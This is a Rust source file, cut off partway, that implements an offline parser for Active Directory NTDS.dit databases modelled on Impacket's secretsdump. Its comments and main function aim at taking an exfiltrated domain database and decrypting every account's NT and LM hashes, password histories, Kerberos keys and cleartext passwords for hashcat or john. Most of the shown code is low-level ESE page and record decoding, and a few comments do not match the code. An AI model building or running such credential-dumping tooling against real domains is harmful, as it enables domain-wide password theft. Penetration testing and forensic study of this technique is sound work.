//! Offline NTDS.dit ESE (Jet Blue) database parser.
//!
//! Impacket `ese.py` + `SecretsDump.py` offline-NTDS parity. Parses the raw
//! ESENT page tree of an exfiltrated `ntds.dit` (VSS shadow copy, esentutl
//! copy, `ovt dump --source ntds-vss` artifact) -- no live DC required.
//!
//! References used (wire-format, not vibes):
//! - Joachim Metz, "Extensible Storage Engine (ESE) Database File (EDB)
//!   format" (libesedb documentation) -- page/tag/record layouts.
//! - fortra/impacket `ese.py` + `examples/secretsdump.py` -- catalog decode,
//!   PEK list crypto (RC4 + AES paths), DES/RC4 secret layers.
//! - synacktiv/ntdissector -- WS2016+ AES PEK list (index,count,key entries).
//!
//! Pipeline:
//! 1. File header: signature `\xef\xcd\xab\x89` at offset 4, version 0x620,
//!    revision (0x11 win7 / 0x14 AD2016 / 0xc8+ Win11), page size (typically
//!    8 KiB for AD).
//! 2. Catalog tree from fixed page 4 (`MSysObjects`): table -> father data
//!    page, columns -> Identifier / ColumnType / SpaceUsage / CodePage.
//! 3. `datatable` tree walk: fixed / variable / tagged column decode per row.
//! 4. PEK list (`ATTk590689`): RC4 (header `02 00 00 00`, up to 2012R2) or
//!    AES-CBC (`03 00 00 00`, WS2016 TP4+) decrypted with the SYSTEM boot key.
//! 5. Secrets: `unicodePwd` / `dBCSPwd` / `ntPwdHistory` / `lmPwdHistory` --
//!    legacy: MD5(PEK+salt) RC4 then DES(RID) layer; modern: AES-CBC(PEK,
//!    salt). `supplementalCredentials` -> WDigest / Kerberos AES keys /
//!    CLEARTEXT via USER_PROPERTIES.
//!
//! Boot key: pass `Some` from the SYSTEM hive (`secretsdump` extractor) or
//! `Some` from `--bootkey` hex. With `None`, records are returned raw
//! (undecrypted) -- honest mode, no fake hashes.
//!
//! Known limitation (stated plainly): CNG/"quantum" encrypted dits
//! (Windows Server 2025 `dsdbbuffer`) are parsed for structure but their
//! secrets remain undecrypted; the tool reports that instead of guessing.

use anyhow::{Result, anyhow, bail};
use des::Des;
use des::cipher::{BlockDecrypt, KeyInit as DesKeyInit};
use md5::{Digest, Md5};
use rc4::Rc4;
use rc4::cipher::StreamCipher;
use rc4::cipher::consts::U16;

// ===========================================================
// Public API
// ===========================================================

/// One parsed `datatable` record (an AD object) with decrypted secrets when
/// a boot key / PEK was available.
#[derive(Debug, Clone, Default)]
pub struct NtdsAccount {
    /// `sAMAccountName` (ATTm590040)
    pub sam_account: Option<String>,
    /// `userPrincipalName` (ATTm590480)
    pub upn: Option<String>,
    /// Raw `objectSid` bytes (ATTb589970)
    pub sid: Option<Vec<u8>>,
    /// RID parsed from the SID (last sub-authority)
    pub rid: Option<u32>,
    /// `sAMAccountType` (ATTj590126)
    pub sam_account_type: Option<u32>,
    /// `userAccountControl` (ATTj589832)
    pub user_account_control: Option<u32>,
    /// Tombstone flag (`ATTi131120` isDeleted)
    pub is_deleted: bool,
    /// Decrypted NT hash (`unicodePwd`, 16B)
    pub nt_hash: Option<[u8; 16]>,
    /// Decrypted LM hash (`dBCSPwd`, 16B)
    pub lm_hash: Option<[u8; 16]>,
    /// Decrypted history hashes (`ntPwdHistory` / `lmPwdHistory`)
    pub nt_history: Vec<[u8; 16]>,
    pub lm_history: Vec<[u8; 16]>,
    /// `Primary:Kerberos(-Newer-Keys)` AES/RC4 keys as (etype, key)
    pub kerberos_keys: Vec<(i32, Vec<u8>)>,
    /// `Primary:CLEARTEXT` password
    pub cleartext: Option<String>,
    /// `Primary:WDigest` hashes
    pub wdigest: Vec<[u8; 16]>,
    /// Raw undecrypted `unicodePwd` (no PEK available)
    pub nt_hash_raw: Option<Vec<u8>>,
    /// Raw undecrypted `supplementalCredentials` (no PEK available)
    pub supplemental_raw: Option<Vec<u8>>,
}

/// Whole-database result.
#[derive(Debug, Clone, Default)]
pub struct NtdsDump {
    /// Recovered PEK keys (16B) in list order
    pub pek_keys: Vec<[u8; 16]>,
    /// Raw encrypted PEK list bytes (kept for external tooling)
    pub pek_list_raw: Option<Vec<u8>>,
    /// All parsed domain objects (users, machines, trusts; tombstones flagged)
    pub accounts: Vec<NtdsAccount>,
    /// Rows that carried no SID (schema/config/sys records)
    pub skipped_records: usize,
}

#[derive(Debug, Clone)]
pub struct NtdsDumpOptions {
    /// 16-byte boot key (SysKey). `None` => raw mode (no hash decryption).
    pub boot_key: Option<[u8; 16]>,
    /// Skip tombstoned records (default true)
    pub skip_deleted: bool,
}

impl Default for NtdsDumpOptions {
    fn default() -> Self {
        Self {
            boot_key: None,
            skip_deleted: true,
        }
    }
}

/// Parse an NTDS.dit (raw bytes) into accounts + decrypted hashes.
pub fn dump_ntds_dit(ntds_data: &[u8], options: &NtdsDumpOptions) -> Result<NtdsDump> {
    let db = EseDb::open(ntds_data)?;
    let config = db.table_config("datatable")?;

    let mut dump = NtdsDump::default();
    let mut decryptor = SecretDecryptor::new(options.boot_key);

    // Column identifiers by ATT number
    let col_sid = config.column_id_by_att(589970);
    let col_sam = config.column_id_by_att(590040);
    let col_upn = config.column_id_by_att(590480);
    let col_samtype = config.column_id_by_att(590126);
    let col_uac = config.column_id_by_att(589832);
    let col_deleted = config.column_id_by_att(131120);
    let col_unicodepwd = config.column_id_by_att(589914);
    let col_dbcspwd = config.column_id_by_att(589911);
    let col_ntpwdhistory = config.column_id_by_att(589915);
    let col_lmpwdhistory = config.column_id_by_att(589912);
    let col_supplemental = config.column_id_by_att(589949);
    let col_peklist = config.column_id_by_att(590689);

    for record in db.iter_table_records(&config)? {
        let sid = record.tagged_bytes(col_sid);
        let deleted = record
            .tagged_bytes(col_deleted)
            .map(|b| !b.is_empty() && b[0] != 0)
            .unwrap_or(false);

        // PEK-list carrier (DomainDNS object; no SID, ATTk590689 present)
        if dump.pek_list_raw.is_none()
            && sid.is_none()
            && let Some(raw) = record.tagged_bytes(col_peklist)
            && raw.len() > 20
            && raw.len().is_multiple_of(4)
        {
            if let Some(bk) = options.boot_key {
                match decrypt_pek_list(&raw, bk) {
                    Ok(keys) if !keys.is_empty() => {
                        decryptor.set_peks(keys.clone());
                        dump.pek_keys = keys;
                    }
                    Err(e) => {
                        tracing::warn!("PEK list present but decryption failed: {e}");
                    }
                    _ => {
                        tracing::warn!("PEK list decrypted to zero keys");
                    }
                }
            }
            dump.pek_list_raw = Some(raw);
        }

        if sid.is_none() {
            dump.skipped_records += 1;
            continue;
        }
        if deleted && options.skip_deleted {
            continue;
        }

        let rid = sid.as_deref().and_then(sid_rid);
        let mut acct = NtdsAccount {
            sam_account: record.tagged_text(col_sam, &config),
            upn: record.tagged_text(col_upn, &config),
            sid: sid.clone(),
            rid,
            sam_account_type: record.tagged_u32(col_samtype),
            user_account_control: record.tagged_u32(col_uac),
            is_deleted: deleted,
            ..Default::default()
        };

        if let Some(raw) = record.tagged_bytes(col_unicodepwd) {
            match decryptor.decrypt_secret(&raw, rid) {
                SecretPlain::Hashes(h) => acct.nt_hash = h.first().copied(),
                SecretPlain::Raw(r) => acct.nt_hash_raw = Some(r),
            }
        }
        if let Some(raw) = record.tagged_bytes(col_dbcspwd)
            && let SecretPlain::Hashes(h) = decryptor.decrypt_secret(&raw, rid)
        {
            acct.lm_hash = h.first().copied();
        }
        if let Some(raw) = record.tagged_bytes(col_ntpwdhistory)
            && let SecretPlain::Hashes(h) = decryptor.decrypt_secret(&raw, rid)
        {
            acct.nt_history = h;
        }
        if let Some(raw) = record.tagged_bytes(col_lmpwdhistory)
            && let SecretPlain::Hashes(h) = decryptor.decrypt_secret(&raw, rid)
        {
            acct.lm_history = h;
        }
        if let Some(raw) = record.tagged_bytes(col_supplemental) {
            match decryptor.decrypt_supplemental(&raw) {
                Some(c) => {
                    acct.kerberos_keys = c.kerberos_keys;
                    acct.cleartext = c.cleartext;
                    acct.wdigest = c.wdigest;
                }
                None => acct.supplemental_raw = Some(raw),
            }
        }

        dump.accounts.push(acct);
    }

    if dump.accounts.is_empty() && dump.skipped_records == 0 {
        bail!("datatable parsed but produced no records -- not an NTDS.dit?");
    }
    Ok(dump)
}

/// User-class accounts suitable for hashcat/john output (normal + machine +
/// trust accounts, excluding tombstones).
pub fn filter_user_accounts(dump: &NtdsDump) -> impl Iterator<Item = &NtdsAccount> {
    dump.accounts.iter().filter(|a| {
        matches!(a.sam_account_type, Some(t) if (0x3000_0000..=0x3000_0002).contains(&t))
            && !a.is_deleted
    })
}

/// Last sub-authority of a binary SID packet (LE u32s, little-endian rev 1).
fn sid_rid(sid: &[u8]) -> Option<u32> {
    if sid.len() < 12 {
        return None;
    }
    let count = sid[1] as usize;
    if count == 0 || 8 + count * 4 > sid.len() {
        return None;
    }
    let off = 8 + (count - 1) * 4;
    Some(u32::from_le_bytes([
        sid[off],
        sid[off + 1],
        sid[off + 2],
        sid[off + 3],
    ]))
}

/// fh mysteries detector per page header big-format (never used directly).
fn le16(d: &[u8], off: usize) -> Option<u16> {
    d.get(off..off + 2)
        .map(|b| u16::from_le_bytes([b[0], b[1]]))
}
fn le32(d: &[u8], off: usize) -> Option<u32> {
    d.get(off..off + 4)
        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

// ===========================================================
// ESE page structures (impacket ese.py / libesedb parity)
// ===========================================================

const FLAGS_ROOT: u32 = 0x1;
const FLAGS_LEAF: u32 = 0x2;
const FLAGS_NEW_FORMAT: u32 = 0x2000;

const CATALOG_PAGE_NUMBER: usize = 4;
const CATALOG_TYPE_TABLE: u16 = 1;
const CATALOG_TYPE_COLUMN: u16 = 2;

const TAG_DEFUNCT: u8 = 0x2;
const TAG_COMMON: u8 = 0x4;

// Value flag bits (inside the 1-byte tagged value flag, when present)
const VFLAG_COMPRESSED: u8 = 0x02;
const VFLAG_LONG_VALUE: u8 = 0x04;
const VFLAG_MULTI_VALUE: u8 = 0x08;

fn coltype_fixed_size(ctype: u32) -> Option<usize> {
    Some(match ctype {
        1 | 2 => 1,
        3 | 17 => 2,
        4 | 14 => 4,
        5 | 7 | 8 | 15 => 8,
        16 => 16,
        _ => return None,
    })
}

/// Parsed page header (one of the three layout generations).
#[derive(Debug, Clone)]
struct PageHeader {
    /// Header byte length (32/36/40; +40 more for extended big pages).
    size: usize,
    page_flags: u32,
    /// Page chain pointers -- parsed for completeness of the [MS-ESE] header.
    #[allow(dead_code)]
    previous_page: u32,
    next_page: u32,
    #[allow(dead_code)]
    father_data_page: u32,
    tag_count: usize,
    first_data_tag: usize,
}

impl PageHeader {
    fn parse(page: &[u8], version: u32, revision: u32, page_size: usize) -> Result<Self> {
        let prefix = if (version < 0x620) || (version == 0x620 && revision < 0x0b) {
            8usize
        } else if version == 0x620 && revision < 0x11 {
            12usize
        } else {
            16usize
        };
        let size = prefix + 24;
        if page.len() < size + 32 {
            bail!("page too small for header: {}", page.len());
        }
        let common = size - 24;
        let previous_page = le32(page, common + 8).unwrap_or(0);
        let next_page = le32(page, common + 12).unwrap_or(0);
        let father_data_page = le32(page, common + 16).unwrap_or(0);
        let first_available_tag = le16(page, common + 26).unwrap_or(0);
        let mut page_flags = le32(page, common + 28).unwrap_or(0);
        // revision 0x122 (Win11) uses the upper 4 bits of the tag word as
        // reserved bits (see Metz notes); keep the 12-bit mask there.
        let (tag_count, first_data_tag) =
            if version == 0x620 && revision >= 0x11 && page_size > 8192 {
                let reserved = (first_available_tag >> 12) as usize;
                let reserved = if reserved == 0 { 1 } else { reserved };
                let count = (first_available_tag & 0x0fff) as usize;
                (count, reserved.min(count))
            } else {
                (first_available_tag as usize, 1usize)
            };
        if revision >= 0x11 {
            // per Metz the "new record format" flag duplicates the checksum
            // generation; keep the flag for tag parsing decisions below.
            page_flags &= !FLAGS_NEW_FORMAT;
        }
        Ok(PageHeader {
            size,
            page_flags,
            previous_page,
            next_page,
            father_data_page,
            tag_count,
            first_data_tag,
        })
    }

    fn is_leaf(&self) -> bool {
        self.page_flags & FLAGS_LEAF != 0
    }
    #[allow(dead_code)]
    fn is_root(&self) -> bool {
        self.page_flags & FLAGS_ROOT != 0
    }
    fn is_index(&self) -> bool {
        self.page_flags & 0x40 != 0
    }
    fn is_long_value(&self) -> bool {
        self.page_flags & 0x80 != 0
    }
    fn is_space_tree(&self) -> bool {
        self.page_flags & 0x20 != 0
    }
}

/// One live page tag (post big-page handling).
struct Tag {
    tag_flags: u8,
    data: Vec<u8>,
}

impl Tag {
    fn is_common(&self) -> bool {
        self.tag_flags & TAG_COMMON != 0
    }
    fn is_defunct(&self) -> bool {
        self.tag_flags & TAG_DEFUNCT != 0
    }
}

/// Raw ESE database view (impacket getPage/getTag parity).
struct EseDb {
    data: Vec<u8>,
    page_size: usize,
    version: u32,
    revision: u32,
}

impl EseDb {
    fn open(data: &[u8]) -> Result<EseDb> {
        if data.len() < 1024 {
            bail!("file too small to be an ESE database");
        }
        if data[4..8] != [0xef, 0xcd, 0xab, 0x89] {
            bail!("bad ESE signature at offset 4 -- not an NTDS.dit/.edb?");
        }
        let version = le32(data, 8).ok_or_else(|| anyhow!("truncated header"))?;
        let file_type = le32(data, 12).ok_or_else(|| anyhow!("truncated header"))?;
        let mut revision = le32(data, 232).ok_or_else(|| anyhow!("truncated header"))?;
        // Page-size slot for revision 0xc8+ (Win11) moved? keep 236; if 0 try 1200.
        let mut page_size = le32(data, 236).ok_or_else(|| anyhow!("truncated header"))? as usize;
        if (page_size == 0 || page_size > 65536)
            && let Some(p) = le32(data, 660)
            && (4096..=65536).contains(&p)
        {
            page_size = p as usize;
            tracing::debug!("page size fallback at offset 660: {p}");
        }
        if revision == 0
            && let Some(r) = le32(data, 340)
        {
            revision = r.max(revision);
        }
        let _ = file_type;
        if !matches!(page_size, 2048 | 4096 | 8192 | 16384 | 32768) {
            bail!("implausible page size {page_size}");
        }
        if data.len() < page_size * 4 {
            bail!("file shorter than 4 pages ({page_size} bytes each)");
        }
        if version != 0x620 && version != 0x623 {
            tracing::warn!("unexpected ESE version 0x{version:x} (expected 0x620)");
        }
        Ok(EseDb {
            data: data.to_vec(),
            page_size,
            version,
            revision,
        })
    }

    /// File slice of logical page `n` (page offset = (n+1) * page_size;
    /// n = -1 evaluates to offset 0 = the file header page).
    fn page(&self, n: isize) -> Result<&[u8]> {
        let off = if n < -1 {
            bail!("page index out of range: {n}")
        } else {
            ((n + 1) as usize) * self.page_size
        };
        if off + self.page_size > self.data.len() {
            bail!("page {n} beyond end of file");
        }
        Ok(&self.data[off..off + self.page_size])
    }

    fn big_page_tags(&self) -> bool {
        self.version == 0x620 && self.revision >= 0x11 && self.page_size > 8192
    }

    fn parse_header(&self, page: &[u8]) -> Result<PageHeader> {
        PageHeader::parse(page, self.version, self.revision, self.page_size)
    }

    /// Read one page tag.
    fn get_tag(&self, page: &[u8], hdr: &PageHeader, tag_num: usize) -> Result<Tag> {
        if tag_num >= hdr.tag_count {
            bail!("tag {tag_num} out of range (count={})", hdr.tag_count);
        }
        // Tags live at the END of the page, tag 0 last ("back to front").
        let tag_off = self.page_size - 4 * (hdr.tag_count - tag_num);
        let w0 = le16(page, tag_off).unwrap_or(0);
        let w1 = le16(page, tag_off + 2).unwrap_or(0);
        if self.big_page_tags() {
            let value_size = (w0 & 0x7fff) as usize;
            let value_offset = (w1 & 0x7fff) as usize;
            let start = hdr.size + value_offset;
            if start + value_size > page.len() {
                bail!("tag {tag_num} data out of page bounds");
            }
            let mut data = page[start..start + value_size].to_vec();
            // First 2 bytes carry the tag flags in 16/32 KiB format.
            let (tag_flags, body) = if data.len() >= 2 {
                let f = data[1] >> 5;
                data[1] &= 0x1f;
                (f, data)
            } else {
                (0, data)
            };
            Ok(Tag {
                tag_flags,
                data: body,
            })
        } else {
            let value_size = (w0 & 0x1fff) as usize;
            let value_offset = (w1 & 0x1fff) as usize;
            let tag_flags = ((w1 >> 13) & 0x7) as u8;
            let start = hdr.size + value_offset;
            if start + value_size > page.len() {
                bail!("tag {tag_num} data out of page bounds");
            }
            Ok(Tag {
                tag_flags,
                data: page[start..start + value_size].to_vec(),
            })
        }
    }

    /// Recursive catalog pass: parse tables from the MSysObjects tree.
    fn parse_catalog(&self) -> Result<Vec<TableConfig>> {
        let mut tables: Vec<TableConfig> = Vec::new();
        let mut current: Option<usize> = None;
        Self::catalog_walk(
            CATALOG_PAGE_NUMBER as isize,
            &mut tables,
            &mut current,
            self,
        )?;
        Ok(tables)
    }

    fn catalog_walk(
        page_num: isize,
        tables: &mut Vec<TableConfig>,
        current: &mut Option<usize>,
        db: &EseDb,
    ) -> Result<()> {
        let page = db.page(page_num)?;
        let hdr = db.parse_header(page)?;
        for tag_num in hdr.first_data_tag..hdr.tag_count {
            let tag = db.get_tag(page, &hdr, tag_num)?;
            if tag.is_defunct() {
                continue;
            }
            if !hdr.is_leaf() {
                // branch entry: child page in the last 4 bytes
                if tag.data.len() < 4 {
                    continue;
                }
                let child = u32::from_le_bytes([
                    tag.data[tag.data.len() - 4],
                    tag.data[tag.data.len() - 3],
                    tag.data[tag.data.len() - 2],
                    tag.data[tag.data.len() - 1],
                ]);
                if child > 0 && (child as usize) * db.page_size < db.data.len() {
                    Self::catalog_walk(child as isize, tables, current, db)?;
                }
                continue;
            }
            // leaf entry: strip common key / local key
            let mut body: &[u8] = &tag.data;
            if tag.is_common() {
                if body.len() < 2 {
                    continue;
                }
                let common_size = le16(body, 0).unwrap_or(0) as usize;
                if 2 + common_size + 2 > body.len() {
                    continue;
                }
                body = &body[2 + common_size..];
            }
            if body.len() < 2 {
                continue;
            }
            let local_size = le16(body, 0).unwrap_or(0) as usize;
            if 2 + local_size > body.len() {
                continue;
            }
            let entry = &body[2 + local_size..];
            if entry.len() < 14 {
                continue;
            }
            // fixed catalog columns: FDP id (4) @0, Type (2) @4, Identifier (4) @6
            let cat_type = le16(entry, 4).unwrap_or(0);
            let identifier = le32(entry, 6).unwrap_or(0);
            match cat_type {
                CATALOG_TYPE_TABLE => {
                    let name = Self::catalog_name(entry, db)?;
                    let fdp = le32(entry, 10).unwrap_or(0);
                    tables.push(TableConfig {
                        name,
                        father_data_page: fdp,
                        fdp_identifier: Some(identifier),
                        columns: Vec::new(),
                    });
                    *current = Some(tables.len() - 1);
                }
                CATALOG_TYPE_COLUMN => {
                    let idx = match current {
                        Some(i) => *i,
                        None => continue,
                    };
                    let name = Self::catalog_name(entry, db)?;
                    let col_type = le32(entry, 10).unwrap_or(0);
                    let space = le32(entry, 14).unwrap_or(0);
                    let col_flags = le32(entry, 18).unwrap_or(0);
                    let codepage = le32(entry, 22).unwrap_or(1252);
                    tables[idx].columns.push(CatalogColumn {
                        identifier,
                        name,
                        col_type,
                        space_usage: space,
                        codepage,
                        _col_flags: col_flags,
                    });
                }
                _ => {}
            }
        }
        if !hdr.is_leaf() {
            // recurse via next-page chain for branch pages too? branch pages
            // carry children only; no next chain needed.
        }
        Ok(())
    }

    /// Catalog row name extraction (impacket __parseItemName verbatim).
    fn catalog_name(entry: &[u8], db: &EseDb) -> Result<String> {
        let last_variable = entry[1] as u32;
        let var_off = le16(entry, 2).unwrap_or(0) as usize;
        let num_entries = if last_variable > 127 {
            (last_variable - 127) as usize
        } else {
            last_variable as usize
        };
        let base = var_off;
        if base + 2 > entry.len() {
            return Ok(String::new());
        }
        let item_len = le16(entry, base).unwrap_or(0) as usize;
        let start = base + 2 * num_entries;
        if start + item_len > entry.len() || item_len == 0 {
            return Ok(String::new());
        }
        let raw = &entry[start..start + item_len];
        // codepage 1200 -> UTF-16LE, otherwise treat as ASCII-ish
        let _ = db;
        let s = if raw.len() >= 2 && raw.len().is_multiple_of(2) {
            // Windows 2003-2022 store the MSysObjects name in UTF-16LE
            String::from_utf16_lossy(
                &raw.chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
                    .collect::<Vec<_>>(),
            )
            .trim_end_matches('\u{0}')
            .to_string()
        } else {
            String::from_utf8_lossy(raw)
                .trim_end_matches('\u{0}')
                .to_string()
        };
        Ok(s)
    }

    /// Parse a table's config out of the parsed catalog.
    fn table_config(&self, name: &str) -> Result<TableConfig> {
        // The catalog carries MSysObjectsShadow duplicates; MSysObjects wins.
        let tables = self.parse_catalog()?;
        let found = tables
            .iter()
            .find(|t| t.name.eq_ignore_ascii_case(name) && t.name == name)
            .or_else(|| tables.iter().find(|t| t.name.eq_ignore_ascii_case(name)));
        found
            .cloned()
            .ok_or_else(|| anyhow!("catalog has no table named {name}"))
    }

    /// Walk a table's B+-tree yielding per-row decoded records.
    fn iter_table_records(&self, config: &TableConfig) -> Result<Vec<EseRecord>> {
        let mut out = Vec::new();
        if !self.has_page(config.father_data_page) {
            bail!("table has invalid father data page");
        }
        self.table_walk(config.father_data_page as isize, 0, config, &mut out)?;
        Ok(out)
    }

    /// True when logical page `n` lies fully within the file.
    fn has_page(&self, n: u32) -> bool {
        ((n as usize + 2) * self.page_size) <= self.data.len()
    }

    fn table_walk(
        &self,
        page_num: isize,
        depth: usize,
        config: &TableConfig,
        out: &mut Vec<EseRecord>,
    ) -> Result<()> {
        if depth > 64 {
            bail!("table tree too deep (corrupt page?)");
        }
        let page = self.page(page_num)?;
        let hdr = self.parse_header(page)?;
        if hdr.is_index() || hdr.is_long_value() || hdr.is_space_tree() {
            // not a table data leaf
            return Ok(());
        }
        if !hdr.is_leaf() {
            for tag_num in hdr.first_data_tag..hdr.tag_count {
                let tag = self.get_tag(page, &hdr, tag_num)?;
                if tag.is_defunct() || tag.data.len() < 4 {
                    continue;
                }
                let child = u32::from_le_bytes([
                    tag.data[tag.data.len() - 4],
                    tag.data[tag.data.len() - 3],
                    tag.data[tag.data.len() - 2],
                    tag.data[tag.data.len() - 1],
                ]);
                if child > 0 && self.has_page(child) {
                    self.table_walk(child as isize, depth + 1, config, out)?;
                }
            }
            return Ok(());
        }
        for tag_num in hdr.first_data_tag..hdr.tag_count {
            let tag = self.get_tag(page, &hdr, tag_num)?;
            if tag.is_defunct() || tag.data.is_empty() {
                continue;
            }
            let mut body: &[u8] = &tag.data;
            if tag.is_common() {
                if body.len() < 2 {
                    continue;
                }
                let common_size = le16(body, 0).unwrap_or(0) as usize;
                if 2 + common_size + 2 > body.len() {
                    continue;
                }
                body = &body[2 + common_size..];
            }
            if body.len() < 2 {
                continue;
            }
            let local_size = le16(body, 0).unwrap_or(0) as usize;
            if 2 + local_size > body.len() {
                continue;
            }
            let entry = &body[2 + local_size..];
            match decode_leaf_record(entry, config, self) {
                Ok(rec) => out.push(rec),
                Err(e) => tracing::debug!("skipping unparsable datatable row: {e}"),
            }
        }
        // follow the next-page chain (leaf level)
        let next = hdr.next_page;
        if next != 0 && self.has_page(next) && next as isize != page_num {
            self.table_walk(next as isize, depth + 1, config, out)?;
        }
        Ok(())
    }
}

// ===========================================================
// Catalog schemas
// ===========================================================

#[derive(Debug, Clone)]
struct CatalogColumn {
    identifier: u32,
    name: String,
    col_type: u32,
    space_usage: u32,
    codepage: u32,
    #[allow(dead_code)]
    _col_flags: u32,
}

/// Full description of one catalog table.
#[derive(Debug, Clone)]
struct TableConfig {
    name: String,
    father_data_page: u32,
    #[allow(dead_code)]
    fdp_identifier: Option<u32>,
    columns: Vec<CatalogColumn>,
}

impl TableConfig {
    fn fixed_columns(&self) -> Vec<&CatalogColumn> {
        self.columns
            .iter()
            .filter(|c| c.identifier <= 127 && c.col_type != 0)
            .collect()
    }
    fn variable_columns(&self) -> Vec<&CatalogColumn> {
        self.columns
            .iter()
            .filter(|c| (127 < c.identifier) && (c.identifier <= 255))
            .collect()
    }
    /// Catalog Identifier of a column whose name suffix matches `att`.
    fn column_id_by_att(&self, att: u32) -> u32 {
        for col in &self.columns {
            if let Some(n) = att_from_name(&col.name)
                && n == att
            {
                return col.identifier;
            }
        }
        att // fallback: on most NTDS.dit identifiers the ATT number matches
    }
    fn codepage_of(&self, id: u32) -> u32 {
        self.columns
            .iter()
            .find(|c| c.identifier == id)
            .map(|c| c.codepage)
            .unwrap_or(1252)
    }
}

/// Parse `ATTxNNNNN` style datatable column names into numeric ATT.
fn att_from_name(name: &str) -> Option<u32> {
    let after = name.strip_prefix("ATT")?;
    let pos = after.find(|c: char| c.is_ascii_digit())?;
    after[pos..].trim().parse::<u32>().ok()
}

/// Decoded values of a record keyed by column identifier.
#[derive(Debug, Default, Clone)]
struct EseRecord {
    indexed: std::collections::BTreeMap<u32, Vec<u8>>,
}

impl EseRecord {
    #[allow(dead_code)]
    fn tagged_bytes_key(&self, id: u32) -> Option<Vec<u8>> {
        self.indexed.get(&id).cloned()
    }
    fn tagged_bytes(&self, id: u32) -> Option<Vec<u8>> {
        self.indexed.get(&id).cloned()
    }
    /// Decode tagged Text column per its catalog codepage (1200 => UTF-16LE).
    fn tagged_text(&self, id: u32, config: &TableConfig) -> Option<String> {
        let raw = self.indexed.get(&id)?;
        let s = if config.codepage_of(id) == 1200 && raw.len() >= 2 {
            String::from_utf16_lossy(
                &raw.chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
                    .collect::<Vec<_>>(),
            )
        } else {
            String::from_utf8_lossy(raw).to_string()
        }
        .trim_end_matches('\u{0}')
        .to_string();
        if s.is_empty() { None } else { Some(s) }
    }
    fn tagged_u32(&self, id: u32) -> Option<u32> {
        self.indexed.get(&id).and_then(|b| {
            if b.len() >= 4 {
                Some(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
            } else {
                None
            }
        })
    }
}

// ===========================================================
// Record decoder (fixed / variable / tagged)
// ===========================================================

fn decode_leaf_record(entry: &[u8], table: &TableConfig, db: &EseDb) -> Result<EseRecord> {
    if entry.len() < 4 {
        bail!("record too small for data definition header");
    }
    let last_fixed = entry[0] as u32;
    let last_variable = entry[1] as u32;
    let variable_size_offset = le16(entry, 2).unwrap_or(0) as usize;
    let big = db.big_page_tags();

    let mut record = EseRecord::default();

    // ---- fixed columns (Ascending Identifier <= LastFixedSize) ----
    let mut fixed_offset = 4usize;
    for col in table.fixed_columns() {
        if col.identifier > last_fixed {
            break;
        }
        let sz = (col.space_usage as usize).max(coltype_fixed_size(col.col_type).unwrap_or(1));
        if col.space_usage == 0 {
            // column takes no storage on this schema variant
            continue;
        }
        if fixed_offset + sz <= entry.len() {
            record.indexed.insert(
                col.identifier,
                entry[fixed_offset..fixed_offset + sz].to_vec(),
            );
        }
        fixed_offset += sz;
    }

    // ---- variable columns (127 < ID <= LastVariableDataType) ----
    let has_variables = last_variable > 127;
    let num_entries = if has_variables {
        (last_variable - 127) as usize
    } else {
        0
    };
    let mut tagged_start = variable_size_offset;
    if has_variables {
        tagged_start += num_entries * 2;
        let mut processed = 0usize;
        let mut prev_item_len = 0usize;
        for col in table.variable_columns() {
            if col.identifier > last_variable {
                break;
            }
            let index = (col.identifier as usize) - 127 - 1;
            let len_off = variable_size_offset + index * 2;
            if len_off + 2 > entry.len() {
                break;
            }
            let item_len = le16(entry, len_off).unwrap_or(0) as usize;
            if item_len & 0x8000 != 0 {
                // empty item: cumulative length unchanged
                continue;
            }
            let value_start = variable_size_offset + processed;
            let value_len = item_len.saturating_sub(prev_item_len);
            if value_start + value_len <= entry.len() {
                record.indexed.insert(
                    col.identifier,
                    entry[value_start..value_start + value_len].to_vec(),
                );
            }
            processed += value_len;
            prev_item_len = item_len;
        }
    }

    // ---- tagged columns (ID > 255) ----
    if tagged_start + 4 <= entry.len() {
        parse_tagged_section(entry, tagged_start, table, big, &mut record.indexed)?;
    }
    Ok(record)
}

/// Metz spec 4.2.3: offset array (id, offset) pairs, then the value data
/// array. Value offsets are relative to the offset array start; the number
/// of pairs is deduced from the FIRST pair's offset (== pairs array size).
/// Sizes: per-pair diffs in ascending offset order; the last value extends
/// to the end of the record. 0x4000 in the offset word => 1-byte flags
/// prefix inside the value (always present on 16/32KiB pages).
fn parse_tagged_section(
    entry: &[u8],
    array_start: usize,
    _table: &TableConfig,
    big: bool,
    out: &mut std::collections::BTreeMap<u32, Vec<u8>>,
) -> Result<()> {
    let tag_len = entry.len();
    if array_start + 4 > tag_len {
        return Ok(());
    }
    let first_offset = off_word(entry, array_start + 2, big) as usize;
    if first_offset == 0 || first_offset > tag_len - array_start {
        return Ok(());
    }
    // collect pairs
    let mut items: Vec<(u32, usize, bool)> = Vec::new(); // (id, offset, flags_present)
    let mut p = array_start;
    while p + 4 <= array_start + first_offset {
        let id = le16(entry, p).unwrap_or(0) as u32;
        let w = off_word(entry, p + 2, big);
        let flags_present = if big { true } else { (w & 0x4000) != 0 };
        let offset = (w & if big { 0x7fff } else { 0x3fff }) as usize;
        if id != 0 {
            items.push((id, offset, flags_present));
        }
        p += 4;
    }
    if items.is_empty() {
        return Ok(());
    }
    // sizes: sort by offset ascending, diff, last extends to record end
    items.sort_by_key(|(_, off, _)| *off);
    for i in 0..items.len() {
        let (id, offset, flags_present) = items[i];
        if offset >= tag_len {
            continue; // empty / default value
        }
        let end = if i + 1 < items.len() {
            items[i + 1].1.min(tag_len)
        } else {
            tag_len
        };
        if end <= offset {
            continue;
        }
        let mut value = entry[offset..end].to_vec();
        if flags_present {
            if value.is_empty() {
                continue;
            }
            let flag = value.remove(0);
            if flag & VFLAG_COMPRESSED != 0 {
                tracing::debug!("tagged column id {id} compressed -- not supported here");
                continue;
            }
            if flag & VFLAG_LONG_VALUE != 0 {
                // value stored in the long-value tree; keep the raw pointer
                // so downstream tooling can see it was omitted
                out.insert(id, value);
                continue;
            }
            if flag & VFLAG_MULTI_VALUE != 0 {
                // store raw multi-value blob (callers only consume singles)
                out.insert(id, value);
                continue;
            }
            if value.is_empty() {
                continue;
            }
        }
        out.insert(id, value);
    }
    Ok(())
}

/// Read the tagged-pair offset word honoring the big-page encoding.
fn off_word(entry: &[u8], pos: usize, big: bool) -> u16 {
    let w = le16(entry, pos).unwrap_or(0);
